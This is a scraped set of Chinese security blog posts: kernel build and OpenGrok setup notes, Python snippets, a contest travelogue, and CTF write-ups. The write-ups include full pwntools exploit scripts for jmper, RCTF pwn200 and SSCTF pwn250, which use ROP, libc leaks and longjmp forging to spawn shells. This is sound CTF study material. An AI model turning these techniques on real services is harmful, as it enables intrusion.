\\-enable-kvm \\-m 2G -smp 2 \\-hda qemu-image.img \\-kernel linux-5.4-rc4/arch/x86/boot/bzImage \\-append &quot;debug root=/dev/sda console=ttyS0&quot; \\-nographic 除了ktsan 1234567qemu-system-x86_64 \\ -drive file=qemu-image.img,index=0 \\ -m 24G -smp 4 \\ -net user,hostfwd=tcp::10022-:22 -net nic \\ -nographic \\ -kernel arch/x86/boot/bzImage -append &quot;console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ&quot;\\ -enable-kvm -cpu host 我用它wiki里的命令无法成功启动，各种panic，或者就是文件系统挂载出问题，我换了我原本的ext2的img之后多试几次，就能正常工作了。 我这里给的是24G内存。 referencektsankmsanlinux-kernel","link":"/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"},{"title":"OpenGrok搭建","text":"0x00: 起因工作环境换到了mac之后很多东西都不一样了。最近在看Linux kernel几个漏洞，需要阅读Linux源码，然而在windows上使用习惯了source insight后，macOS上一脸懵逼，不知道啥工具好使。了解到OpenGrok之后，决定搭建一个，主要是添加源码方便，也方便实用，感觉还不错。 其实vim或者subl这类编辑器看源码也可以，只是我还没习惯。所以就先OpenGrok啦～ 0x01: 准备工作根据github上项目的wiki可知，需要的准备工作如下： JDK 1.8 or higher {OpenGrok binaries from https://github.com/OpenGrok/OpenGrok/releases (either the package for Solaris, or .tar.gz with binaries, NOT the src !) Exuberant Ctags for analysis (https://github.com/universal-ctags is recommended) A servlet container like GlassFish or Tomcat (8.x or later) also running with java at least 1.8 If history is needed, appropriate binary (in some cases also cvs/svn repository) must be present on the system (e.g. Subversion or Mercurial or SCCS or … ) 2GB of memory for indexing process using OpenGrok script (can use less, this is scaled for bigger deployments) a recent browser for clients - IE, Firefox, recent Chrome or Safarisufficient ULIMIT settings (refer to README) 我在自己服务器上搭建的，系统是ubuntu，在安装了jdk8之后，去下载了tomcat和opengrok的包。这里说个题外话，使用apt-get方式安装的tomcat8很奇怪，服务起来了，但是curl访问本地8080的时候，没回应，所以我最后去官网下载了一个tomcat的包。 0x02：过程如果是很多人用，推荐专门创建一个用户，做好权限的隔离，个人使用的话无所谓了。 准备工作 找一个目录，把下载来的tomcat和opengrok解压了。 启动tomcat，然后访问http://127.0.0.1:8080，确定tomcat正常工作。 1ubuntu@VM-64-163-ubuntu:~$ ./apache-tomcat-8.5.16/bin/startup.sh 为项目创建目录，拿我自己的举例子： 1path/to/your/opengrok_projects/prj1 目录结构如下： 123path/to/your/opengrok_projects/prj1 |-----/prj2 |-----/prj3 部署opengrok 部署 1OPENGROK_TOMCAT_BASE=path/to/apache-tomcat path/to/opengrok/bin/OpenGrok deploy 创建索引 1OPENGROK_VERBOSE=true OPENGROK_INSTANCE_BASE=./opengrok_data ./opengrok-1.1-rc5/bin/OpenGrok index ./opengrok_projects 创建索引时，会创建三个目录，一个data目录来存放索引信息，一个etc目录创建配置信息和一个log目录。 修改配置文件 在path/to/apache-tomcat/webapps/source/WEB-INF目录下的web.xml文件 把 12345&lt;context-param&gt; &lt;param-name&gt;CONFIGURATION&lt;/param-name&gt; &lt;param-value&gt;/var/opengrok/etc/configuration.xml&lt;/param-value&gt; &lt;description&gt;Full path to the configuration file where OpenGrok can read it's configuration&lt;/description&gt; &lt;/context-param&gt; 中的/var/opengrok/etc/configuration.xml修改成对应的opengrok的path/to/opengrok/data/etc/configuration.xml 12345&lt;context-param&gt; &lt;description&gt;Full path to the configuration file where OpenGrok can read its configuration&lt;/description&gt; &lt;param-name&gt;CONFIGURATION&lt;/param-name&gt; &lt;param-value&gt;/home/ubuntu/opengrok_data/etc/configuration.xml&lt;/param-value&gt;&lt;/context-param&gt; 我这里是这个样子的。 把源码放进project目录 我这里放的是linux-3.18.1的源码。以后如果想更新的话，直接放进去，然后重新生成索引就好了。 0x03:效果 0x04:参考wiki OpenGrok安装使用指南","link":"/2017/07/05/OpenGrok%E6%90%AD%E5%BB%BA/"},{"title":"PlaidCTF 2016 butterfly","text":"0x00:这个题目是之前和0x9A82学弟一起看的，第一次遇到这种bit位翻转的题目，在讨论了十多分钟之后才搞明白一个国际友人的解法，当时觉得他这个解法太巧妙了~遂做个记录。 0x01:程序大概的逻辑如下，直接放IDA F5之后的代码好了，部分变量为了阅读方便重命名了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl main(int argc, const char **argv, const char **envp){ signed int v3; // er14@1 __int64 addr; // rax@2 char bit; // bl@2 _BYTE *addr2; // rbp@2 void *base_addr; // r15@2 __int64 v8; // rax@5 char buffer; // [sp+0h] [bp-68h]@1 __int64 v11; // [sp+40h] [bp-28h]@1 v11 = *MK_FP(__FS__, 40LL); setbuf(_bss_start, 0LL); puts(&quot;THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?&quot;); v3 = 1; if ( fgets(&amp;buffer, 50, stdin) ) { addr = strtol(&amp;buffer, 0LL, 0); bit = addr; addr2 = (_BYTE *)(addr &gt;&gt; 3); base_addr = (void *)((addr &gt;&gt; 3) &amp; 0xFFFFFFFFFFFFF000LL); if ( mprotect(base_addr, 0x1000uLL, 7) ) { perror(&quot;mprotect1&quot;); } else { v3 = 1; *addr2 ^= 1 &lt;&lt; (bit &amp; 7); // 0000 0111 if ( mprotect(base_addr, 0x1000uLL, 5) ) { perror(&quot;mprotect2&quot;); } else { puts(&quot;WAS IT WORTH IT???&quot;); v3 = 0; } } } v8 = *MK_FP(__FS__, 40LL); if ( *MK_FP(__FS__, 40LL) == v11 ) LODWORD(v8) = v3; return v8;} 程序逻辑很简单，大概做了这几件事： 读取用户输入，使用strtol()把输入转成long类型的值。 把这个值右移3 bits，我标记成了addr_base。 调用mprotect()，修改base_addr指向的内存属性。 addr2最低3 bits反转。 再次调用mprotect()，修改base_addr指向的内存属性。 0x02:Thinking开始我的想法是写sc进去然后修改程序流程，跳进去执行。但是并没有搞定，在看了一份wp之后豁然开朗。这里是main执行结束后返回的汇编代码，老外那份wp里的做法就是，使用bit翻转，把add rsp,48h编程add rbp,48h，这样的话，相当于我们可以控制返回地址。有了上面的基础之后，第一次修改指令，后面构造循环1字节1字节的把shellcode写到合适的位置，然后在最后一次直接retn到那个位置，执行代码。 123456.text:0000000000400860 add rsp, 48h.text:0000000000400864 pop rbx.text:0000000000400865 pop r14.text:0000000000400867 pop r15.text:0000000000400869 pop rbp.text:000000000040086A retn 0x03:Exploit0x04:Reference butterfly-wp-by-r0p","link":"/2016/11/25/PlaidCTF-2016-butterfly/"},{"title":"Python指定概率获取随机元素","text":"0x00:最近写fuzzer遇到了这样的一个需求，生成样本的时候，有些元素需要尽可能的多出现，而有些需要少一点，这就涉及到概率的问题了。然而直接使用random是不行的，暴力的在lib_list上做文章也不行，反而效率更低。看到了python cookbook的两个例子。 0x01:第一种，给定概率123456789101112131415# -*- coding: utf-8 -*-#!/usr/bin/pythonimport randomdef random_pick(some_list,probabilities): x = random.uniform(0,1) cumulative_probability=0.0 for item,item_probability in zip(some_list,probabilities): cumulative_probability+=item_probability if x &lt; cumulative_probability: break return item 两个参数，第一个是参数列表，第二个是概率的列表，概率列表里元素相加和必须等于1比如这么调用： 1random_pick([1,2,3,4],[0.1,0.2,0.3,0.4]) 写代码大概测了下，在大量(&gt;10w)的测试下，比较稳定，按照指定概率产生元素，比如x等于0.1就返回1。但是不太适合较多参数的情况，需要一个一个指定概率啥的，还要计算好概率和为1…蛋疼。 第二种，给权重123456789import randomdef random_picks(sequence,relative_odds): table=[z for x,y in zip(sequence,relative_odds) for z in [x]*y] while True: yield random.choice(table)x=random_picks('ciao',[1,1,3,2])import itertoolsprint ''.join(itertools.islice(x,8)) 第二种根据权重来返回，只要求权重是非负整数，比较容易使用，虽然还是要一个一个给权重，但是总比还要去计算个概率和，好很多。","link":"/2017/12/30/Python%E6%8C%87%E5%AE%9A%E6%A6%82%E7%8E%87%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/"},{"title":"SECCON-2016 jmper","text":"0x00:ZCTF2017 的class的原型应该就是这个题目，在复现的时候，就从这个题目开始做起。 0x01：vuln关键逻辑的代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102void __noreturn handle(){ char v0; // [sp+3h] [bp-1Dh]@13 char v1; // [sp+3h] [bp-1Dh]@23 int index; // [sp+4h] [bp-1Ch]@8 int v3; // [sp+8h] [bp-18h]@2 int i; // [sp+Ch] [bp-14h]@12 __int64 student_name; // [sp+10h] [bp-10h]@12 student *student; // [sp+18h] [bp-8h]@6 student_num = 0; while ( 1 ) // show student name { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(&quot;1. Add student.\\n2. Name student.\\n3. Write memo\\n4. Show Name\\n5. Show memo.\\n6. Bye :)&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); getchar(); if ( v3 != 1 ) break; if ( student_num &gt; 29 ) // check num { puts(&quot;Exception has occurred. Jump!&quot;); longjmp(jmpbuf, 0x1BF52); } student = (student *)malloc(48uLL); // add student student-&gt;id = student_num; student-&gt;name = malloc(32uLL); *(_QWORD *)(my_class + 8LL * student_num++) = student; } if ( v3 != 2 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // name student __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, &quot;Input name:&quot;); student_name = *(_QWORD *)(*(_QWORD *)(my_class + 8LL * index) + 40LL);// get ptr for ( i = 0; i &lt;= 32; ++i ) { v0 = getchar(); if ( v0 == '\\n' ) break; *(_BYTE *)student_name++ = v0; } } if ( v3 != 3 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // write memo __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, &quot;Input memo:&quot;); student_name = *(_QWORD *)(my_class + 8LL * index) + 8LL; for ( i = 0; i &lt;= 32; ++i ) // write one more byte { v1 = getchar(); if ( v1 == '\\n' ) break; *(_BYTE *)student_name++ = v1; } } if ( v3 != 4 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // show name __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, *(_QWORD *)(*(_QWORD *)(my_class + 8LL * index) + 40LL)); } if ( v3 != 5 ) break; printf(&quot;%s&quot;, &quot;ID:&quot;); // show memo __isoc99_scanf(&quot;%d&quot;, &amp;index); getchar(); if ( index &gt;= student_num || index &lt; 0 ) { puts(&quot;Invalid ID.&quot;); exit(1); } printf(&quot;%s&quot;, *(_QWORD *)(my_class + 8LL * index) + 8LL); } exit(0);} 结构体： 12345student struct { _QWORD id; _BYTE memo[32]; _QWORD *name;} 编辑memo的时候有个off by one，导致可以覆盖下一个student结构体的name指针的最后一个字节。 0x02：thinkstudent结构体在内存里的布局大概这个样子： 1234567891011121314151617stud1: -------------------------- | | | id | | memo_buf[0x20] | | name -----------------|----- | | | -------------------------- | | | |name1: | -------------------------- &lt;--| | | | name_buf | | | -------------------------- 先分配五个这样的结构体，然后修改student2的name指针，使其指向student3的name。这样，通过name、memo的write和show功能就可以获取任意地址读写的能力了。 有了这个基础后，因为程序使用了jmpbuffer，会把一些寄存器信息加密后存储在jmpbuffer，我们有任意地址读写之后： 只需要leak出和jmpbuffer的偏移 泄露出stored rip，和真实的rip xor后得到secret xor 值， 随便泄露一个函数，然后根据libc确定system函数地址 然后，直接修改寄存器的值，然后触发longjmp，就可以代码执行了。 0x03：exploitwin10 subsystem 上测试通过。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *#context.log_level = 'debug'context.arch='amd64'LOCAL = Trueif LOCAL: p = process('./jmper',raw=False)else: p = remote('127.0.0.1',10001)elf = ELF('./jmper')libc = ELF('./libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')printf_got = elf.got['printf']def rerol(d): return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffffdef rol(d): return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffffdef add_student(): p.recvuntil(':)') p.sendline('1')def name_student(id,name): p.recvuntil(':)') p.sendline('2') p.recvuntil('ID:') p.sendline(str(id)) p.recvuntil('name:') p.sendline(str(name))def memo_student(id,memo): p.recvuntil(':)') p.sendline('3') p.recvuntil('ID:') p.sendline(str(id)) p.recvuntil('memo:') p.sendline(str(memo))def show_name(id): p.recvuntil(':)') p.sendline('4') p.recvuntil('ID:') p.sendline(str(id))def show_memo(id): p.recvuntil(':)') p.sendline('5') p.recvuntil('ID:') p.sendline(str(id))def exit_(): p.recvuntil(':)') p.sendline('6')def get_shell(): for __ in xrange(0,25): add_student() add_student()def main(): #raw_input('0x0000000000400B99') log.info('printf got : %s' % (hex(printf_got))) add_student() add_student() add_student() add_student() add_student() name_student(0,'A') name_student(1,'B') name_student(2,'C') name_student(3,'D') name_student(4,'E') memo_student(0,'a') memo_student(1,'b') memo_student(2,'c') memo_student(3,'d') memo_student(4,'e') #get jmp buffer offset memo_student(1,'c' * 0x20 + '\\xe8') name_student(1,'A') show_name(1) dump = p.recvline() jmp_buffer_lsw = ((ord(dump[1]) &amp;0xf0) &lt;&lt; 8) | 0x110 log.info(&quot;Got jmpbuffer offset %x&quot; % jmp_buffer_lsw) #get xor word rip_addr = jmp_buffer_lsw + 0x38 name_student(1,p16(rip_addr)) show_name(2) dump = p.recvline() rip_stored = unpack(dump[:8]) log.info(&quot;Got stored rip : %s&quot; % hex(rip_stored)) rip = rerol(rip_stored) secret_xor = rip ^ 0x400c31 log.info(&quot;Got xor vaule : %s&quot; % hex(secret_xor)) #rbx /bin/sh rip_addr = jmp_buffer_lsw name_student(1,p16(rip_addr)) name_student(2,&quot;/bin/sh&quot;) #leak addr and get system's addr name_student(1,p64(printf_got)) show_name(2) printf_addr = u64(p.recv(6).ljust(8,'\\x00')) log.info('leak printf : %s' % hex(printf_addr)) libc_base = printf_addr - libc.symbols['printf'] system_addr = libc_base + libc.symbols['system'] log.info('system addr : %s' % hex(system_addr)) new_rip = system_addr ^ secret_xor new_rip = rol(new_rip) log.info('New rip is : %s' % hex(new_rip)) memo_student(3,&quot;D&quot; * 0x20 + &quot;\\xc8&quot;) name_student(3,p16(jmp_buffer_lsw+0x38)) name_student(4,p64(new_rip)) get_shell() p.interactive()if __name__ == '__main__': main() 0x04：referencewrite-ups-2016[第三届XCTF——郑州站ZCTF第一名战队Writeup]](http://bobao.360.cn/ctf/detail/186.html)","link":"/2017/03/06/SECCON-2016-jmper/"},{"title":"RCTF -- PWN200","text":"0x00:XCTF开赛了，只看了pwn，这次还比较有意思，有x86 x64 arm mips 多种cpu构架的pwn。自己只搞出了pwn200 0x01:基本信息x64 动态链接 有调试符号(怪不得是最简单的…)开启的保护如图可以看到。运行下，随便给点输入:经过分析，发现问题出在echo()函数,而且这个bof的payload大概的格式： 1payload = \"A\"*24+\"BBBBBB\"+\"\\x00\\x00\" 0x02:思路利用构造的ROP链先去 leak 远程服务器上libc里的system地址，然后利用ROP链再次把 &quot;/bin/sh&quot; 和system()地址 写入程序的.bss段，最后再次利用ROP链去执行 system(&quot;/bin/sh&quot;) 但是要注意：x64的函数调用 参数传递顺序是RDI RSI RDX RCX R8 R9之后的参数才用栈传递。 在IDA中看下:我们可以利用 pwntools的 去得到程序中write()和read()这些系统调用的got，用来构造ROP。这时候要使用的是 通用型的ropgads，因为源程序中并没有一些辅助性的东西。在初始化libc的时候，这些指令可以为我们所用来构造ROP，设置好参数。因为也没有给libc，所以要leak libc中的函数地址，pwntools的dynELF很好用。 0x03:exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# coding=utf-8# author:muhe# http://www.cnblogs.com/0xmuhe/from pwn import *elf = ELF('./pwn200')p=remote('127.0.0.1',6666)#p = remote('180.76.178.48',6666)#p = process('./pwn200')addr1=0x40089Aaddr2=0x400880main_addr = 0x4007CDppppr=0x40089cbss_addr=0x601078got_write = elf.got['write']got_read = elf.got['read']flag=Truedef leak(address): global flag junk = \"A\"*24 p1=\"\" p1+=junk p1+=p64(ppppr) p1+=p64(addr1) p1+=p64(0)+p64(1)+p64(got_write)+p64(8)+p64(address)+p64(1) p1+=p64(addr2) p1+=\"\\x00\"*56 p1+=p64(main_addr) p.recvuntil('F\\n') p.send(p1) #raw_input() if flag: data = p.recv(8) flag=False else: p.recv(0x1b) data = p.recv(8) print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return datad = DynELF(leak, elf=ELF('./pwn200'))system_addr = d.lookup('system','libc')print \"system_addr=\" + hex(system_addr)#----------------write /bin/sh to .bss-----------------#junk = \"A\"*24payload=\"\"payload+=junkpayload+=p64(ppppr)payload+=p64(addr1)payload+=p64(0)+p64(1)+p64(got_read)+p64(24)+p64(bss_addr)+p64(0)# addr_junk_rbx_rbp_r12_r13_r14_r15#order:RDI RSI RDX RCX R8 R9payload+=p64(addr2)payload+=\"\\x00\"*56payload+=p64(main_addr)p.recvuntil('F\\n')print \"payload 1 ....\"#raw_input()p.send(payload)sleep(1)p.send(\"AAAABBBB\")p.send(\"/bin/sh\\0\")p.send(p64(system_addr))#raw_input()print \"sent ..\"#raw_input()sleep(1)#-----------------get shell --------------------------#junk = \"A\"*24payload2=\"\"payload2+=junkpayload2+=p64(ppppr)payload2+=p64(addr1)payload2+=p64(0)+p64(1)+p64(bss_addr+16)+p64(1)+p64(1)+p64(bss_addr+8)# addr_junk_rbx_rbp_r12_r13_r14_r15#order:RDI RSI RDX RCX R8 R9payload2+=p64(addr2)payload2+=\"\\x00\"*56payload2+=p64(main_addr)p.recvuntil('F\\n')#raw_input()print \"payload 2 ....\"p.send(payload2)print \"ok get shell\"p.interactive() 后来遇到个问题，exp打本地，或者是socket搭建起来的都可以打，但是远程服务器打不了。 - -# 尴尬 0x04:算是学习了一波吧，有收获就是好的。","link":"/2015/11/16/RCTF-PWN200/"},{"title":"SSCTF-2017部分Writeup","text":"0x00刚结束的SSCTF2017，自己只做了一点。 Pwn250栈溢出，简单粗暴，但是程序是静态链接的，又有NX保护，直接ROP就好了。 思路就是，在.bss上构造参数，然后使用int 0x80起shell。 exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# -*- coding: utf-8 -*-#!/usr/bin/env python2from pwn import *context.log_level = 'debug'context.arch = 'i386'LOCAL = Falsemain_addr = 0x0804887Cint80_gad_addr = 0x0806cbb5#0x3a+4+4read_addr = 0x0806D510write_addr= 0x0806D580bss_addr = 0x080ECA35xor_eax_eax_ret = 0x080493a3pop_ebx_ret = 0x080481c9pop_ecx_ret = 0x080df1b9pop_edx_ret = 0x0806efbbadd_al_ret = 0x080b4f19mov_esp_ecx = 0x080b8c22if LOCAL: p = process('./250')#,env=env) #p = process('filename',raw=False) #this for Windows10 subsystemelse: p = remote('60.191.205.81',2017)def fuck(size,data): p.recvuntil('Size]') p.sendline(str(size)) p.recvuntil('Data]') p.sendline(str(data))def main(): ''' gdb.attach(p,&quot;&quot;&quot; b *0x08048986 c &quot;&quot;&quot;) ''' payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8) fuck(0x100,payload) p.send(&quot;/bin/sh\\0&quot;) sleep(2) payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr+10) + p32(8) fuck(0x100,payload) p.send(p32(bss_addr)) sleep(2) payload = 'A'*(0x3a+4) + p32(xor_eax_eax_ret)+p32(pop_ebx_ret)+p32(bss_addr) payload += p32(pop_ecx_ret) + p32(bss_addr+10) payload += p32(pop_edx_ret) + p32(0) payload += p32(add_al_ret) * 0xb payload += p32(int80_gad_addr) fuck(0x100,payload) p.interactive()if __name__ == '__main__': main() apk1程序会加密ctf1.xlsx，加密是每隔0x100字符加密一次。 加密的大概逻辑是： 先调用验证函数 private boolean verify(String arg11, String arg12)，会根据签名算出一个k1[40] 根据输入的6位数字，和k1操作后得到新的k1 进入加密逻辑，使用新的k1与xlsx的每隔0x100的字符，循环亦或。 思路就是，反向先推一点，可以根据加密后的xlsx和正常的比对，能得到k1的前三个字节。 然后我把java代码复制出来新建一个java的工程，去爆破6位数字： 16位数字 ---&gt; 和k1生成新的k1 ---&gt; 然后比对前三字节 然后使用private boolean encode(Context arg12)，把加密前后的文件名换一下，就可以直接解出来。 apk2 login主要的函数在native层。把输入的12字节扩展为16字节，然后到java层去验证，正确的话经过AES解密弹出flag。 经过分析，只要使得输入的12字节经过变换后，等于 01635e6c5f2378255f27356c11663165 就好了。 主要的算法是，把输入的12字节分成4组，每组3个字节，每组的变化规律是 1234L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3FL[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xfL[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]L[flag[2] &amp;0x3f] = res[3] 写脚本做还原操作就行了 123456789101112131415161718192021222324252627282930313233343536373839404142res = [0x01,0x63,0x5e,0x6c, 0x5f,0x23,0x78,0x25, 0x5f,0x27,0x35,0x6c, 0x11,0x66,0x31,0x65]final = [0x21, 0x3A, 0x23, 0x24, 0x25, 0x26, 0x28, 0x29, 0x2B, 0x2D, 0x2A, 0x2F, 0x60, 0x7E, 0x5F, 0x5B, 0x5D, 0x7B, 0x7D, 0x3F, 0x3C, 0x3E, 0x2C, 0x2E, 0x40, 0x5E, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x5C, 0x27, 0x3B]'''L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3FL[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xfL[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]L[flag[2] &amp;0x3f] = res[3]'''def get_index(target): return final.index(target)def fuck(): flag = [] for i in xrange(0,len(res),4): ch0 = ((get_index(res[i] ^ 0x3f) &lt;&lt; 2) &amp; 0xff)+(get_index(res[i+1] ^ 0xf) &gt;&gt; 4) flag.append(ch0) ch1 = ((get_index(res[i+1] ^ 0xf) &lt;&lt; 4) &amp; 0xff) + (get_index(res[i+2]) &gt;&gt; 2) flag.append(ch1) ch2 = ((get_index(res[i+2]) &lt;&lt; 6 ) &amp; 0xff) + get_index(res[i+3]) flag.append(ch2) return flagout = &quot;&quot;for ch in fuck(): out += chr(ch)print out#VVe1lD0ne^-^ 安装apk到手机上，然后输入得到的字符串，得到flag Music 300 你知道我在等你吗拿到一个mp3，先binwalk看了一下： zip啊，手动修改文件后缀为zip，然后直接解压得到如下： 二维码并没有什么卵用…coffee是加密的zip，把mp3丢进010 editor，发现后面多了一部分数据，strings之后得到一个有点奇怪的字符串： 尝试使用它解密zip…居然可以 :) 解开之后有个coffee.jpg 惯例使用binwalk扫一下： 并没有什么特别的地方。 在使用010 editor查看的时候，搜了下一些其他文件的文件头里的标志字符之类的，发现了： 前面的coffee也好奇怪，从coffee开始截取出来，找了个png头，尝试修复一下，然后打开： 得到一个二维码，扫一下，是让你去下载一个txt…其实这是个zip，但是后面拼接了一部分提示的字符串。 简直….丧心病狂。 猜了好多密码…什么coffee、seclover之类的，差点要爆破了。后面队友提示说要不要试试伪加密。 直接丢进010 editor 使用二进制模板解析后，修改标志位 然后尝试解压得到一个txt，里面是一串base64 12keyis%7Bsec1over%25_6ugscan_@coffee%7D#keyis{sec1over%_6ugscan_@coffee}","link":"/2017/05/08/SSCTF-2017%E9%83%A8%E5%88%86Writeup/"},{"title":"Snell auto install cript","text":"0x00 : SnellSnell是Surge支持的一种**协议，但是server并不开源，也就是说只有Surge客户端才能用。 琢磨了下写了个自动化的配置脚本。 0x01 : Scriptsnel.sh","link":"/2019/09/26/Snell-auto-install-cript/"},{"title":"Symbolic Execution学习","text":"0x00: 前言学习的时候做个记录，看过什么，踩过什么坑之类的。 0x01: 资料1. paper &amp;&amp; 不错的文章《All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)》 《Symbolic execution for software testing: three decades later》 符号执行入门 2. 项目KLEE Z3 Angr 3. 一些资源3.1 z3主要是解决一些CTF题目。 Z3一把梭：用约束求解搞定一类CTF题 使用z3约束器解决CTF中的题目 z3-stuf 3.2 angr angr-doc 使用angr解决一些ctf题目，这部分直接参考angr-doc里的examples就好了。 angr-ctf 很好的入门资料，各种基础用法都有demo，注释很全面，跟着学习就好了。 环境建议：Linux + virtualenv 关注各大ctf中wp 4. 实践demo1. mini mcThis directory contains a “minimal” implementation to demonstratethe basic ideas of symbolic execution and concolic execution, usingZ3’s Python interface.","link":"/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/"},{"title":"TFC游记","text":"0x00 ：前言很幸运能随团队一起参加中国版pwn2own–天府杯国际破解大赛。对于我这样一个刚毕业几个月的菜鸟来说，真的是见了大世面，也从这个经历、随行的同事身上学到了很多东西，对于自己而言，我认为这次经历是加速自身成长的神奇药剂。 0x01 ：赶赴成都11月15日跟随大部队乘坐早上7:45的飞机从北京赶往成都，正好前一天北京雾霾严重，可以说是去蓉城躲一躲了 23333。 作为一个菜鸟，跟着大佬们就对了，到了成都之后，吃完午饭大家就快速赶往了赛场做前期准备工作，比如环境的查看工作。 不得不说，会场真的太太太太太太太太大了，酒店距离会场真的太远了，16km简直是噩梦，太不方便了。 晚上回到酒店后，在古先生的带领下大家去吃了跷脚牛肉，在北京待得时间长了，大家都吃不了太辣。 我还是个愣头青，我觉得我才从成都过去几个月，我应该可以，结果晚上睡觉的时候，胃里热辣辣的感觉告诉我，too young啊少年。 0x02 ： 比赛日 day1因为是破解大赛，大家都是揣着0day(s)来到会场的，古先生再三提醒，千万看好自己的包、电脑，互相帮忙看住。那段时间感觉警惕性达到顶峰，一个声称自己是360市场部的同事来坐到我们桌子这边时候，我第一反应是怀疑他到底是不是真的，有啥目的😢。 早上9:30开始的是重头戏，抽签。老早就听说，这种比赛最重要的就是抽签，签序能影响很多，但是前提是：你必须有足够的储备，你必须有足够的储备，你必须有足够的储备。 因为策略，男哥、我、团队，我们报了三个PDF项目，没想到似乎是微博抽奖的锦鲤属性，我PDF抽到第一个，团队的是第二个（这个时候感觉自己在做梦…这也太棒了吧！)。不得不说，day1真的是我们的幸运日，几乎所有大项都抽到了第一个，只有龚神的一个小米8排到了最后 :( 我们团队从edge开始打，毫无悬念的一次通；然后是龚神的Chrome，一次就成，太强了；之后我跟着男哥去打了PDF，从杨博士双击1.pdf那个文件开始，呼吸加速，默默祈求着calc你快出来，reader卡了几秒之后，calc直接弹出，破解成功！之后就是和厂商、内场裁判一起review了，确定你的漏洞真实有效。这个过程有点漫长，adobe来的那个老哥貌似不是做技术的，验证了好久 :( 。 之后团队的PDF也成功打下，龙哥的Safari也顺利拿下…后面肖伟哥和天文的VirtualBox、VMware顺利搞定。 男哥的PDF在day2，他紧急回酒店忙相关的事情。后面因为没我什么事我就先去和李专家(L3m0n)以及学弟吃晚饭了，火锅接近尾声的时候，男哥那边有些情况，我就直接打车回了酒店找他，希望可以帮上一些忙。 不得不说这次被出租车师傅坑了，不打表直接开价不说，中间还加了一次价格，我想看副驾上有啥信息，车牌、电话啥的，想投诉的时候缺发现啥也没有，遂放弃，还是赶紧回去找男哥汇合，别耽误正事。 0x03 ： 比赛日 day2因为第一天奠定的巨大优势，没必要再浪费漏洞，就放弃了一些项目。就只有大宝师傅的Safari和iPhone x rjb。 大宝师傅打完之后，后面就没什么看的了，涅槃团队的Safari+穿sandbox，因为Safari撞洞，所以只有穿sandbox的分数，很可惜吧。 后面颁奖没啥好说的了，大宝师傅的优秀个人，天文的最牛技术，实至名归，都很厉害，都是我学习的榜样。 0x04 ：一些感想首先是陈少公开夸奖大宝。 这种无公司界限的纯技术上的赞赏，真的让人有种“英雄惜英雄”的感觉，虽然这句话不是很正确，但是总就感觉很棒。 我一直觉得，大宝师傅算是同龄人里的一个标杆，在安全研究上的工作，以及他的想法、态度，都值得我去学习。 我们小组流传着一句：寻找大师，追随大师，成为大师，超越大师，以及tk教主很早以前说的，在同龄人里找一个标杆，行业前辈中再找一个标杆（大概这样的意思吧），我认为综合起来，现在都找到了。希望在安全的道路上，可以早点看到前辈们的车尾灯，希望可以早点追赶上他们。 比赛结束就结束了，结束之后和男哥沟通了很多，不得不感叹工作后遇到男哥这样的导师真的是太幸运了，男哥真的是我的贵人。 后续的工作也有一个大概的规划了，以及对以后一个发展方向有了更清楚的认识，前辈们思考问题的维度、深度的确是高了几个层次，这些还需要慢慢学习。男哥说，安全这条路，你就算有天赋也要堆时间。这话很对，更何况我这样没有天赋的凡人，需要的不仅仅是时间，还有努力努力再努力 :) 至于赛场外的一些事，我觉得没什么好说的，团队里的大佬也没说什么，可能大家见得多了，已经很佛系了。 